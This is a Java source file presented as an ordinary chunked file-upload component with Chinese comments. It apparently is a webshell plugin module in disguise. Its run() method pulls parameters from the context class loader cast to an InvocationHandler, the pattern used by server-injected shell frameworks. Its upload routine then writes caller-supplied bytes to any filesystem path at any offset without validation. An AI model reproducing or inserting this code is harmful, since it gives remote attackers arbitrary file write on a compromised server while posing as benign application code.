package org.leo.core.component;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.HashMap;

/**
 * 文件上传组件
 * 提供文件分块上传功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class FileUploadComponent implements Runnable {

    
    private HashMap params;
    private HashMap results;
  
    
    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    
    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        fileUpload();
    }

    /**
     * 文件上传（线程安全）
     */
    private synchronized void fileUpload() throws Exception {
        Object pathObj = params.get("path");
        Object offsetObj = params.get("offset");
        Object dataObj = params.get("data");

        
        String path = new String((byte[]) pathObj, "utf-8");
        
        long offset = offsetObj != null ? ((Number) offsetObj).longValue() : 0;
        byte[] data = (byte[]) dataObj;
        
        File file = new File(path);
        if (!file.exists()) {
            file.createNewFile();
        }
        
        RandomAccessFile outputFile = null;
        try {
            outputFile = new RandomAccessFile(file, "rw");
            outputFile.seek(offset);
            outputFile.write(data);
        } finally {
            closeResource(outputFile);
        }
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
}
